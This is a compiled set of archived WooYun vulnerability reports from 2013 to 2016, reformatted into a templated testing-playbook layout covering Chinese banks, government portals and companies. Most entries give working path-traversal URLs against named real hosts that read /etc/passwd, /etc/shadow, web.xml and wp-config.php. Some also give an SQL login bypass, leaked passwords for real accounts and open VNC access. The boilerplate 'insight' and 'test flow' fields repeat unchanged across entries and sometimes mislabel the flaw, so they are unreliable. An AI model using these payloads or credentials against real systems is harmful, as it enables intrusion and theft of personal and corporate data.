**POC**: 1、查看自己家里帐单的时候，右键图片URL地址不小心发现的。。2、下载配置文件web.xmlhttp://sh.189.cn/service/showImage?file=/usr/IBM/WebSphere/AppServer/profiles/AppSrv01/installedApps/SHWT_APPCell01/service_02.ear/service.war/WEB-INF/web.xml3、找到个数据库配置文件4、下载其他jsp源文件http://sh.189.cn/service/showImage?file=/usr/IBM/WebSphere/AppServer/pro

**绕过**: 直接利用

**修复**: 你们比我懂
---

---
### [wooyun-2013-034251] 东风目录遍历及未授权访问造成帐单等敏感信息泄露
**厂商**: dfyb.com | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.dflpj.cn/main/http://www.dflpj.cn/temp/http://www.dfyb.com.cn/inc/http://www.dfackc.net/database.rar数据库

**POC**: 求礼物来了

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-027968] 某市人民政府网站目录遍历漏洞可下载源码
**厂商**: 藁城市人民政府门户网站 | **年份**: 2013 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.列出目录2.网站源码备份3个左右（先下载）3.下载后的源码展览4.ew数据库（作用不大）

**POC**: 这目录就是证明了。

**绕过**: 直接利用

**修复**: 不多说。一个危险但是修复又简单的漏洞。多给几个rank
---

---
### [wooyun-2016-0171318] 新华保险在线客服任意文件下载漏洞
**厂商**: 新华保险 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 参考自WooYun: live800客服系统任意文件下载漏洞中公开的地址，新华保险主站访问http://www.newchinalife.com/live800/downlog.jsp?path=/&fileName=/etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-086199] 国家能源局华东监管局目录遍历
**厂商**: 国家能源局 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.ecerb.gov.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 目录权限！
---

---
### [wooyun-2015-0124542] 慧聪网某站任意文件下载漏洞
**厂商**: 慧聪网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.jj.hc360.com/wp-content/plugins/db-backup/download.php?file=/etc/passwd又是败在了WORDPRESS插件更新不及时上面读取数据库http://www.jj.hc360.com/wp-content/plugins/db-backup/download.php?file=/usr/local/apache2/htdocs/wp-config.phproot权限

**POC**: http://www.jj.hc360.com/wp-content/plugins/db-backup/download.php?file=/etc/passwd又是败在了WORDPRESS插件更新不及时上面读取数据库http://www.jj.hc360.com/wp-content/plugins/db-backup/download.php?file=/usr/local/apache2/htdocs/wp-config.phproot权限可惜MYSQL是内网 不能连接读取apache配置<VirtualHost *:80>DocumentRoot "/usr/local/apache

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-091246] 某系统漏洞影响国内多家地方银行
**厂商**: 国内多家地方银行 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标站点：www.xtbank.com原始链接：http://www.xtbank.com/download/download.jsp?filepath=/site902/uploadfiles/zxgg/1413941582458.xls&filename=1413941582458.xls&ei=Ht2xVLPgGpOnyASX34DACA&usg=AFQjCNGeC93YEDRmk2Km8iyVcBb7iv8VNQ变换下：http://www.xtbank.com/download/download.jsp?filepath=download/download.jsp再次变换：http://www.xtbank.com/download/download.jsp?filepath=../../../../../../../../../../windows/win.ini无疑，典型的任

**POC**: 如上所述！

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-054137] 上海外国投资促进平台任意文件下载
**厂商**: 上海外国投资促进平台 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://wz.investment.gov.cn/SFI/bsAffairdocsAction.do?method=excute&path=WEB-INF/web.xml

**POC**: wz.investment.gov.cn/SFI/bsAffairdocsAction.do?method=excute&path=WEB-INF/web.xml

**绕过**: 直接利用

**修复**: 避免目录跨越
---

---
### [wooyun-2015-0103010] 联想某服务管理平台#SQL注射
**厂商**: 联想 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: POST /lx3c/login.aspx HTTP/1.1Host: yuyue.ecare365.comProxy-Connection: keep-aliveContent-Length: 397Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://yuyue.ecare365.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36Content-Type: application/x-www-form-ur

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤啊。亲。
---

---
### [wooyun-2015-092712] ShopEx某两台服务器任意文件读取
**厂商**: ShopEx | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://122.144.135.187:8888/../../../../../../../../../../../../../../../../../etc/shadowhttp://121.196.44.117:8888/../../../../../../../../../../../../../../../../../etc/shadow

**绕过**: 直接利用

**修复**: 我也不知道
---

---
### [wooyun-2015-0137383] 途牛网某支付服务器存在敏感信息泄漏
**厂商**: 途牛旅游网 | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞的地址如下：http://180.97.2.9/.svn/entries通过泄漏的信息，我们可以下载到ugv.war文件，该文件中，我们可以看到网站的源码。通过查看相关页面，可以大致猜测是途牛的测试接口。不过我在该文件中发现了一些支付证书以及证书的密码。还有mysql的连接密码，由于对java不熟，我也就不挖是不是有漏洞了。就到这里吧。ugv.war 文件下载地址为http://180.97.2.9/.svn/text-base/ugv.war.svn-base

**POC**: 漏洞的地址如下：http://180.97.2.9/.svn/entriesugv.war 文件下载地址为http://180.97.2.9/.svn/text-base/ugv.war.svn-base当然发现的证书有很多，还有密码，我就不多截图了。不多说，上图。

**绕过**: 直接利用

**修复**: 对文件访问做好权限控制，不使用的服务器要注意及时下线。
---

---
### [wooyun-2014-054141] 江西省水利厅任意文件下载
**厂商**: 江西省水利厅 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: www.jxsl.gov.cn/download.jsp?action=download&filename=../../download.jsp

**POC**: www.jxsl.gov.cn/download.jsp?action=download&filename=../../download.jsp

**绕过**: 直接利用

**修复**: 禁止目录跨越
---

---
### [wooyun-2015-0102696] 清华大学某处任意文件读取
**厂商**: 清华大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0171319] 北京德恒律师事务所办公系统弱口令+目录遍历+上传任意文件+员工工号重置（可查看案件）
**厂商**: 北京德恒律师事务所 | **年份**: 2016 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**弱口令:test/123456目录遍历登陆后重新访问http://**.**.**.**上传任意文件重置工号员工密码重置后可以查看自己当前处理的案件添加管理权限

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0161180] 建发集团学习管理系统存在任意文件下载漏洞/可下载敏感文件
**厂商**: 厦门建发股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址http://59.57.252.59采用的是wizBank®学习管理系统爆出过任意文件下载漏洞比如下载etc/password文件 可以构造如下语句cw/skin1/jsp/download.jsp?file=../../../../etc/passwd文件打开如图

**POC**: 地址http://59.57.252.59采用的是wizBank®学习管理系统爆出过任意文件下载漏洞比如下载etc/password文件 可以构造如下语句cw/skin1/jsp/download.jsp?file=../../../../etc/passwd文件打开如图

**绕过**: 直接利用

**修复**: 对文件下载功能的下载文件名称、类型及路径进行严格的检查和限制。
---

---
### [wooyun-2015-0137156] 湖北省地质局任意文件下载（可读shadow）
**厂商**: 湖北省地质局 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: RT

**POC**: 将参数fileUrl值修改，发现可以跳脱网站路径，下载系统上的文件/etc/shadow和其他系统上档案：http://**.**.**.**/GGDownload?filename=shadow.txt&fileUrl=../../../../etc/shadow&contenttype=&filetype=put_document/etc/shadow/etc/passwdRSA PRIVATE KEY 可惜没有开ssh port ，不然就直接进入了/WEB-INF/struts-config.xml程序原始码可下载，例如：/logon/login.jsp

**绕过**: 直接利用

**修复**: 限制路径限制扩展名
---

---
### [wooyun-2015-0126349] 中石化某系统问题打包可导致内部资料泄漏
**厂商**: 中国石油化工股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国石化工程建设诚信体系管理系统http://219.143.118.86/ZYK/1#某邮箱密码泄漏在用户注册页面，左上角找回密码登陆126邮箱用户名(sinopec_ztb1),密码(1qaz2wsx)收件箱2#iis短文件名3#任意文件下载http://219.143.118.86/ZYK/Handler/DownLoadFile.ashx?path=../../web.confighttp://219.143.118.86/TZGG/Handler/DownloadFile.ashx?path=../../Login.aspx

**POC**: 当然，以上都不是重点，重点是系统的目录浏览权限未关，导致各种用户资料泄漏http://219.143.118.86/fileupload/特别是以下3个路径http://219.143.118.86/FileUpload/ZJK/一堆的大头照http://219.143.118.86/fileupload/ZJK/File/一堆的专家资料比如http://219.143.118.86/fileupload/ZJK/File/009733c1-9c65-41ea-9386-fb64fc7dd***.pdfhttp://219.143.118.86/fileupload/TZGGhttp://21

**绕过**: 直接利用

**修复**: 关闭目录浏览权限，求高rank
---

---
### [wooyun-2015-0138374] 浙江省政府采购网任意文件下载漏洞（权限可读shadow密码）
**厂商**: 浙江省财政厅 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: RT

**POC**: 将参数fileNam值修改，发现可以跳脱网站路径，下载系统上的文件/etc/shadow和其他系统上档案http://**.**.**.**/DownloadServlet?fileName=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow&fileShowName=etc/passwd&fileSize=70144passwdshadow程序原始码可下载，例如：VerifySSL.jspweb.xml

**绕过**: 直接利用

**修复**: 限制路径限制扩展名
---

---
### [wooyun-2013-026615] 多家银行的项目文档目录遍历任意下载（里头可能有配置文件）
**厂商**: 国内外银行 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ...

**POC**: 以吉林银行为例

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0213449] 渤海银行某系统存在任意文件下载漏洞
**厂商**: cbhb.com.cn | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 14年的洞到现在仍然久未修复，是当时没通知到位吗https://ebank.cbhb.com.cn/webappservice/TP050102.do?FileName=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

**POC**: https://ebank.cbhb.com.cn/webappservice/TP050102.do?FileName=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhosts

**绕过**: 直接利用

**修复**: 过滤../
---

---
### [wooyun-2015-0108587] 酷我音乐某站任意文件读取
**厂商**: 酷我音乐 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://yinyue.kuwo.cn/etc/hosts

**绕过**: 直接利用

**修复**: 下线
---

---
### [wooyun-2016-0207846] 浙江省农村信用社某漏洞可远控
**厂商**: 浙江农信 | **年份**: 2016 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意挂马，下载，目录遍历等

**POC**: vnc远控漏洞**.**.**.** password**.**.**.** password 二个都是任意控制。

**绕过**: 直接利用

**修复**: 5800，5900端口：          1.首先使用fport命令确定出监听在5800和5900端口的程序所在位置（通常会是c:\winnt\fonts\explorer.exe)         2.在任务管理器中杀掉相关的进程（注意有一个是系统本身正常的，请注意！如果错杀可以重新运行c:\w
---

---
### [wooyun-2014-079010] 盛大某站存在任意文件下载漏洞
**厂商**: 盛大网络 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 盛大某站存在任意文件下载漏洞。http://211.136.104.52:8055/Standard/DownloadFile.aspx?filename=

**POC**: 211.136.104.52:8055/Standard/DownloadFile.aspx?filename=../Web.config

**绕过**: 直接利用

**修复**: ·疑似已废弃，可以将此业务下线。
---

---
### [wooyun-2013-038800] appcms 最新版 1.3.708 任意文件下载
**厂商**: appcms.cc | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: /pic.php<?phpif(isset($_GET['url']) && trim($_GET['url']) != '' && isset($_GET['type'])) {$img_url = base64_decode($_GET['url']);//$shffix = substr($img_url,strrpos($img_url,'.'));$shffix = trim($_GET['type']);header("Content-Type: image/{$shffix}");readfile($img_url);} else {die('image not find��');}?>访问无任何控制，只是url进行了base64编码只要构造文件路径base64即可任意文件下载示例/pic.php?url=Y29yZS9jb25maWcuY29ubi5waHA=&type=j

**POC**: 官方演示网站 下载config.conn.phphttp://www.an12.com/pic.php?url=Y29yZS9jb25maWcuY29ubi5waHA=&type=jpg

**绕过**: 编码绕过

**修复**: 你们懂得，这个文件神奇的存在我就不猜测胡说了
---

---
### [wooyun-2015-0150648] 华网电子文档管理系统任意文件下载/数据库下载漏洞
**厂商**: 徐州市华网信息科技有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 徐州市华网信息科技有限责任公司产品：电子文档管理系统这个系统的案例还别说，挺多的。。。。漏洞一：数据库备份脱裤实际上都存在这个漏洞，但部分好像老提示备份出错，难道不支持FSO？简单来一些可以备份的：**.**.**.**:81/admin/backup.aspxhttp://**.**.**.**:81/xwd/admin/backup.aspx**.**.**.**:90/xywd34/admin/backup.aspx**.**.**.**:85/wd2/admin/backup.aspx**.**.**.**:90/xywd24/admin/backup.aspx#**.**.**.**:90/xywd50/admin/backup.aspx**.**.**.**:81/wd/admin/backup.aspx#**.**.**.**:90/xywd8/admin/backup.as

**POC**: 1#：**.**.**.**:81/wd/admin/backup.aspx#2#:http://**.**.**.**/dzwd/download2.aspx?fn=../web.config

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-059819] 某通用行政服务中心任意文件下载及网上审批系统用户信息泄露
**厂商**: Cncert | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 技术支持服务：上海卓繁信息技术股份有限公司0x01:行政服务中心任意文件下载漏洞（全版本）说明：这里验证几种不同的版本，测试发现都可下载配置文件web.xml，且路径中暴露网站绝对路径。http://tlzw.tongliao.gov.cn/servlet/FileDownload?filepath=D:\%C9%CF%BA%A3%D7%BF%B7%B1\Tomcat6_tongliao\webapps\ROOT\WEB-INF\web.xml&dispname=web.xmlhttp://www.zwfw.gov.cn/index/downLoadGonggaoAtta.action?filePath=D:\zfwork\tomcat_web_new\webapps\ROOT\WEB-INF\web.xml&fileName=web.xmlhttp://www.whxzfw.gov.cn

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-089131] 某国家部级政府站疑似TRS备份数据泄露
**厂商**: 某国家部级政府 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 闲来无事，扫了一下网络，发现中华人民共和国国土资源部，存在一个压缩包。下载发现是TRS CMS（拓尔思CMS）的数据库。漏洞曾经提交过，不知道是不是后来又新产生的备份信息：WooYun: 中国人民共和国国土资源部备份文件下载TRSWAS是拓尔思系列产品的重要组成部分，服务于信息资源的发布。数据库配合的版本为：trs server版本TRS(R) Enterprise Database Master 6.80.5290.64was版本:trswas 4.5作为一个国家对内对外的门户，还是把备份信息及时删除掉。不要被非法或海外分子利用。

**POC**: mask 区域1.http://**.**.**/mlr.zip

**绕过**: 直接利用

**修复**: 删除备份。
---

---
### [wooyun-2014-082915] 艾诺体检中心某网站漏洞泄露大量体检报告(包括个人资料、身体状况等)系列一
**厂商**: 艾诺体检 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: PS：第一发信息量不是很多，之后会有十几万、五十万、...，审核同学能否给个机会，上个首页？公司：艾诺体检链接：http://www.aino.hk首页有个报告查询，点进去之后试了下没有注入但是存在目录遍历http://218.22.33.234:8050/，HealthReport对应体检报告、Upload对应体检用户信息HealthReport文件夹下报告数 24233看一份比较新的报告mask 区域*****fd6e42031a657b230ad7.jpg&qu**********498de253107cf244e376.jpg&qu**********ec2df9f4f2cd5afdf33e92.jpg*****Upload文件夹下用户预约信息 250个文件，写了个脚本，统计了下，近4W用户打开一份最新的mask 区域*****	CompanyCode	DateF*********

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 限制访问
---

---
### [wooyun-2015-0103638] 惠尔顿上网行为管理系统XML实体注入（无需登录）
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 惠尔顿上网行为管理系统XML实体注入（无需登录）官网经典案例：http://www.wholeton.com/Anli.php外网部分实际案例：1.https://test.bescar.com2.https://angelic.com.cn/3.http://222.223.56.1164.https://222.92.15.1005.http://111.206.133.4/6.http://mail.hualiu.cc/这里存在一个通用的xml实体注入问题之前有过分析：WooYun: 74CMS最新版绕过继续任意文件读取(通用性分析)到任意文件删除这里也用到了那个微信的接口，导致同样的问题，不过这里没有文件读取，但是导致大量SQL注文件：/base/wechat_interface.php<?php/*** wechat php test*///define your token$t

**POC**: 保存如下请求为111.txtPOST /base/wechat_interface.php HTTP/1.1Host: https://test.bescar.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateX-

**绕过**: 过滤绕过

**修复**: 个系统可以重写了。。。
---

---
### [wooyun-2015-0163002] 银鹭集团某办公系统任意文件下载
**厂商**: 银鹭集团 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 银鹭集团某办公系统任意文件下载。地址：http://**.**.**.**//oa/admin/application/file_download.jsp?filePath=c:\windows\system.ini

**POC**: http://**.**.**.**//oa/admin/application/file_download.jsp?filePath=C:\Windows\System32\drivers\etc\servicesecho                7/tcpecho                7/udpdiscard             9/tcp    sink nulldiscard             9/udp    sink nullsystat             11/tcp    users                  #Active userss

**绕过**: 直接利用

**修复**: ...
---

---
### [wooyun-2013-016877] 55.la云应用word转pdf导致的任意文件下载
**厂商**: 55.la | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在转化好文件内容以后，我们可以获得一个类似的下载链接：http://218.85.137.24:82/2pdf/down.aspx?fn=/down/2013/x/xx/xxx/xxxxx.pdf直接访问ip可以知道这个应该是55.la的站点。服务器为windows 2003.其在百度云上线的应用存在类似的问题的还有：http://yun.baidu.com/cloud/appdetail?type=2&appid=256715http://yun.baidu.com/cloud/appdetail?type=2&appid=256718只是目录不一样：d:\topdf\exceltopdf\  d:\topdf\web2  不再枚举...

**POC**: 修改下载地址为：218.85.137.24:82/2pdf/down.aspx?fn=/2pdf/down.aspx.cs就可以得到下载文件的源码了。抓包：http://218.85.137.24:82/ToPDF.aspx这里生成pdf.

**绕过**: 直接利用

**修复**: 过滤并且限制目录,这个问题还是比较棘手，估计评论的人有办法。建议修复。云还是很安全的，看你怎么用了。
---

---
### [wooyun-2014-062770] 某通用政务系统全服务器任意文件下载漏洞
**厂商**: 黑龙江海康软件工程有限公司 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞存在于黑龙江海康软件工程有限公司开发的行政审批系统通过谷歌搜索发现，在用的有哈尔滨市行政服务中心方正县行政审批服务中心木兰县行政审批服务中心依兰行政服务中心等等

**POC**: 以哈尔滨市行政审批服务中心为例，来说明任意文件下载存在于表格下载处，正常的一个表格下载链接如下http://218.9.149.56/fileFetcherServlet?filePath=D:\HIGHCOM\jboss-4.0.4.GA\jboss-4.0.4.GA\server\default\deploy\xzsp_hrb_oracle.war\serviceForm\serviceFormCRE308861195010631015.rar&downloadName=%C6%F3%D2%B5%D7%A2%CF%FA%B5%C7%BC%C7%C9%EA%C7%EB%CA%E9.rarfi

**绕过**: 直接利用

**修复**: 限制可下载的目录
---

---
### [wooyun-2015-0140278] 华润纺织销售平台配置不当导致客户及管理员信息泄漏+可终止合同或收款（绕过安全限制）
**厂商**: 华润纺织(集团)有限公司 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 认证接口

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://219.134.61.11:81/Login.jsp加了过滤但是可以f12修改输入admin'or'1'='1密码任意登录成功目录遍历依然存在客户信息管理员信息合同管理

**POC**: f12修改输入admin'or'1'='1密码任意管理员信息合同管理

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-093308] 中国电信多个分站任意文件读取
**厂商**: 中国电信 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1，一个存在于中国电信翼家康业务：http://www.yjkang.cn/home_home.action存在任意文件读取的地方：http://www.yjkang.cn/home_downMmanual.action?manualFileName=../../WEB-INF/web.xmlmanualFileName未做过滤。读取了web.xml，读struts配置：读取的过程中有几次服务器挂了- -不太方便，所以不深入了。

**POC**: 另一处存在于：http://qjs.189.cn/域名读取不行，但是同个ip下的8081端口开放了，可以读取到web.xml：

**绕过**: 直接利用

**修复**: 过滤参数
---

---
### [wooyun-2015-0103279] 53KF某重要站点任意文件读取
**厂商**: 53KF企业在线平台 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站：tel.53kf.comcontroller可控request：GET /external.php?controller=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00web&style=61565627-4006633536-103387129 HTTP/1.1User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US)Accept: */*Accept-Language: en-us,en;q=0.8,en-us,en;q=0.5Cache-Control: no-cacheHost: tel.53kf.comCookie: guest_id=36843397905Accept-E

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0143922] 广汽三菱某后台系统存在弱口令
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**/main.jsp登录用户名和密码：admin/admin123（太容易猜了）即可进入后台，查看信息并下载文件等内容。

**POC**: 敏感信息泄露：可以对信息进行修改：任意文件下载。。。没做任何破坏性操作~

**绕过**: 直接利用

**修复**: 更改系统密码。
---

---
### [wooyun-2015-0155183] 爱屋吉屋某内部站点存在任意文件读取漏洞
**厂商**: iwjwagent.com | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

